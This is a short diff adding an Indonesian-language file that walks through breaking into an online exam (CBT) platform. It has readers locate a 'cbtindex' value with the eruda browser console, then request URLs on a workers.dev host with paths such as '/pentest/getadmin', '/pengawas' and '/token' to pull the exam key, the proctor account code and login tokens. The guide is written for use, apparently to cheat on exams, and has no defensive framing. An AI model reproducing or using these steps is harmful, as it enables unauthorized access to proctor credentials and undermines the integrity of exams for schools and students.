@@ -1,0 +1,12 @@
+Pada awalnya kalian hanya perlu mencari cbt index menggunakan eruda
+?cbtindex=2 nilainya bisa berganti, bisa saja di punya anda tidak 2
+1. Mendapatkan examkey
+https://cbtadmin.bimasoft.workers.dev/?cbtindex=2&_=/pentest/getadmin
+setelah mendapat examkey kalian hanya perlu menulis link seperti cat.my.id/?examkey= disini examkey
+
+2. Menemukan kode akun pengawas
+https://cbtadmin.bimasoft.workers.dev/?cbtindex=2&_=/pengawas
+
+3. Menemukan token login
+https://cbtadmin.bimasoft.workers.dev/?cbtindex=212&_=/token
+
